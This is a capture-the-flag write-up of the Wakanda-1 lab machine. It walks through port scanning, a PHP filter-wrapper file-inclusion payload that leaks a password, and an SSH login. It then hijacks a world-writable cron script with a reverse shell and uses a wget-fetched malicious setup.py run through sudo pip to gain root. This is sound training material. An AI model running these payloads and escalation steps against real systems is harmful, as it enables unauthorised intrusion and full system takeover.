# Phase 1: Reconnaissance and Network Enumeration
1.1 Host Discovery
I started by identifying the target machine's IP address on my local network. I used netdiscover to perform an ARP scan within the virtual environment.

Target IP Identified: 10.0.2.7

Method: ARP Scanning (Layer 2 discovery)

1.2 Comprehensive Port Scanning
After identifying the target, I performed a full TCP port scan to map the attack surface.
Command used: nmap -sS -sV -A -p- 10.0.2.7

Key Findings and Open Ports:

Port 80 (HTTP): Running Apache 2.4.10 (Debian). The page title is "Vibranium Market." This will be my primary entry point for web vulnerability analysis.

Port 111 (RPC): rpcbind service is active. This could potentially leak information about the system's RPC services.

Port 3333 (SSH): OpenSSH 6.7p1 is running on a non-standard port. Moving SSH from port 22 to 3333 is a "security through obscurity" tactic.

Port 56311 (RPC): An additional RPC status service was detected.

1.3 Initial Technical Analysis
The Nmap results confirm that the target is a Linux (Debian) machine. Since the SSH service is on a non-standard port, it shows the administrator attempted to hide it, but a full port scan (-p-) easily revealed it.

My next step is to perform web enumeration on port 80 to search for hidden directories, source code comments, or potential vulnerabilities like Local File Inclusion (LFI).



# Phase 2: Web Vulnerability Analysis & Exploitation
2.1 Information Gathering (Source Code Analysis)
While inspecting the homepage of http://10.0.2.7, I discovered a hidden hint within a comment in the HTML source code:
``

This revealed a potential File Inclusion vulnerability via the lang parameter.

2.2 Testing for Local File Inclusion (LFI)
I initially attempted common LFI payloads to read sensitive files like /etc/passwd:

?lang=../../etc/passwd

?lang=/etc/passwd

However, these attempts failed, suggesting that the application might be appending a .php extension to the input or using some form of filtering.

2.3 Bypassing Filters with PHP Wrappers
To bypass the execution of PHP files and read their source code, I used the PHP Filter Wrapper. This technique encodes the file content into Base64, preventing the server from executing it and instead forcing it to display the encoded string.

Exploit URL:
http://10.0.2.7/?lang=PHP://filter/convert.base64-encode/resource=index

Result: I successfully obtained a Base64 encoded string of the index.php file. After decoding the string, I found a password.

2.4 Gaining Initial Access (SSH)
The website footer mentioned "Made by @mamadou". Using this hint, I attempted an SSH login:

User: mamadou

Password: (Decoded password from index.php)

Command: ssh mamadou@10.0.2.7 -p 3333

Status: Access Granted. Initial shell obtained.



# Phase 3: Privilege Escalation (From Mamadou to Devops)
3.1 TTY Shell Stabilization
Upon gaining initial access via SSH as mamadou, I noticed the environment was not a fully interactive TTY shell, which limited my ability to execute complex commands. To stabilize the shell and gain an interactive bash environment, I used the following Python pty module command:

Command: python -c 'import pty; pty.spawn("/bin/bash")'

This step allowed me to use standard terminal features like tab-completion, job control, and interactive prompts (essential for sudo or editing files).

3.2 Internal Enumeration & Hidden Script Discovery
I began searching for files or processes owned by other users that might be exploitable. During my search in the /srv directory, I discovered a hidden Python script:

Path: /srv/.antivirus.py

Permissions: After running ls -la, I realized that while this script was intended for system maintenance by a higher-privileged user, it was world-writable. This means any user on the system, including mamadou, could modify its content.

3.3 Exploitation via Cronjob Automation
The existence of an "antivirus" script in a system directory like /srv strongly suggested it was being executed automatically by a Cronjob.

The Strategy: Instead of trying to run the script manually (which would only give me a shell with my current privileges), I decided to hijack the automated execution.

Payload Injection: I replaced the original code of .antivirus.py with a custom Python Reverse Shell payload. I configured the payload to connect back to my Kali Linux machine on port 1234.

The Waiting Game: Because Cronjobs run on a schedule (e.g., every 5 minutes), I set up a Netcat listener (nc -nvlp 1234) on my Kali machine and waited.

Execution: After approximately 4 minutes, the system's task scheduler executed the script. Since the task was owned by the devops user, the reverse shell was triggered with devops privileges.

3.4 Outcome
The connection was successfully received, granting me a new shell. Running whoami confirmed that I had successfully escalated my privileges from mamadou to devops.



# Phase 4: Final Privilege Escalation (Root)
4.1 Exploitation Strategy: Remote File Transfer
Since the target machine (Wakanda-1) did not have the exploit files, I needed to transfer my malicious Python package from my Kali machine.

Local Setup: I downloaded the FakePip tool on my Kali machine and configured the .py script with my local IP and a listening port.

Hosting the Exploit: I moved the exploit files to my local Apache directory (/var/www/html/) and started the service:
sudo systemctl start apache2

File Transfer: From the Wakanda-1 terminal (as devops), I used wget to fetch the malicious package:
wget http://[KALI_IP]/setup.py

4.2 Executing the Pip Exploit
With the malicious setup.py now on the target, I leveraged the Sudo misconfiguration discovered earlier.

Command: sudo /usr/bin/pip install .

Technical Logic:
The pip install . command triggers the execution of setup.py. Because it was run with sudo, the Python script executed with UID 0 (root). The FakePip script initiated a reverse shell connection back to my listener.

4.3 Root Access & Final Flag
After the command executed, my Netcat listener (nc -nvlp [PORT]) received a connection from the target.

Current User: root

Final Objective: I navigated to the /root directory and captured the final flag.